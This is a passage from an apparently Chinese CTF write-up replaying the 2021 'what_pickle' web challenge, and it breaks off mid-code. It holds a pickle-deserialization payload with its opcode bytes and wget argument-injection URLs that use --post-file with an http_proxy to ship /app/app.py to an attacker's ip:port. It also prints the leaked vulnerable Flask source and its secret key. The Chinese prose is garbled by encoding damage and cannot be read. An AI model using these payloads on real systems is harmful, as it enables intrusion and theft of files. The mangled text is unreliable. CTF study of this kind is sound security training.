&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ticket&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;guess_game.Ticket&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Ticket&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">game&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;guess_game&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;game&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">game&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">curr_ticket&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ticket&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">ticket&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># b&amp;#34;(I0\niguess_game.Ticket\nTicket\np0\n0cguess_game\ngame\np1\n0g1\n(N(S&amp;#39;curr_ticket&amp;#39;\ng0\ndtbg0\n.&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
æ —å­3 - [å·…å³°æå®¢ 2021]what_pickle
&lt;/h4>
&lt;/summary>
&lt;p>ç™»å½•é¡µé¢ ä»»æ„å¯†ç å‡å¯ç™»å…¥ï¼Œä»…æ˜¾ç¤ºä¸€å¼ å›¾ç‰‡+ç™»å½•æ—¶è¾“å…¥çš„å¯†ç ï¼›å›¾ç‰‡çš„urlä¸º/images?image=2.jpgï¼Œä½†æ˜¯ä¸èƒ½å¸¸è§„çš„ç›®å½•ç©¿è¶Šæ‹¿æºç ï¼Œå½“æ—¶åšçš„æ—¶å€™å°±ä¸ä¼šäº†ï¼Œä¸‹é¢æ˜¯å¤ç°&lt;/p>
&lt;p>/imageså¯ä»¥çœ‹åˆ°å¼€ç€çš„debugç•Œé¢&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024174438862.png" alt="image-20211024174438862">&lt;/p>
&lt;p>èƒ½çœ‹åˆ°éƒ¨åˆ†çš„æºç ï¼Œè¿™é‡Œçš„å›¾ç‰‡æ˜¯ç”¨çš„wgetå‘½ä»¤æ¥ä¸‹è½½æœ¬åœ°8080ç«¯å£çš„/imageå›¾ç‰‡ï¼Œæ‰€ä»¥æˆ‘ä»¬å°è¯•wgetå‘½ä»¤æ³¨å…¥å°†æ–‡ä»¶å¤–å¸¦å‡ºæ¥&lt;/p>
&lt;pre tabindex="0">&lt;code>/images?image=&amp;amp;argv=--post-file=/app/app.py&amp;amp;argv=--execute=http_proxy=http://ip:port
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>/images?image=&amp;amp;argv=â€”post-file=/app/app.py&amp;amp;argv=-e http_proxy=http://ip:port
&lt;/code>&lt;/pre>&lt;p>ä¾æ¬¡è¯»å‡º/app/app.pyå’Œ/app/config.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># app.py&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">url_for&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">redirect&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">io&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">random&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">subprocess&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">ctypes&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">cdll&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">config&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">notadmin&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">user&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">cdll&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">LoadLibrary&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;./readflag.so&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">config&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">update&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">RestrictedUnpickler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Unpickler&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">find_class&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;config&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#d88200">&amp;#34;__&amp;#34;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">modules&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">UnpicklingError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;global &amp;#39;&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">.&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#39; is forbidden&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">restricted_loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;Helper function analogous to pickle.loads().&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">RestrictedUnpickler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">BytesIO&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">load&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/index&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">None&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url_for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;home&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index.html&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/login&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">methods&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;POST&amp;#34;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">login&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;test&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">User&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">user&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;info&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">User&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url_for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;home&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/home&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">home&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">info&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;info&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">User&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">restricted_loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">info&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Jpg_id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;home.html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">Jpg_id&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">info&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">User&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/images&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">images&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;wget&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">getlist&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;argv&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">true_argv&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">startswith&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;-&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#d88200">&amp;#39;--&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">image&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;image&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">extend&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">true_argv&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">extend&lt;/span>&lt;span style="color:#111">([&lt;/span>&lt;span style="color:#d88200">&amp;#34;-q&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;-O&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;-&amp;#34;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://127.0.0.1:8080/&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">image&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">image_data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">subprocess&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">stdout&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">subprocess&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">PIPE&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">stderr&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">subprocess&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">PIPE&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">image_data&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">stdout&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">host&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">debug&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">port&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">80&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># config.py&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;On_You_fffffinddddd_thi3_kkkkkkeeEEy&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">notadmin&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;admin&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#d88200">&amp;#34;no&amp;#34;&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">username&lt;/span>
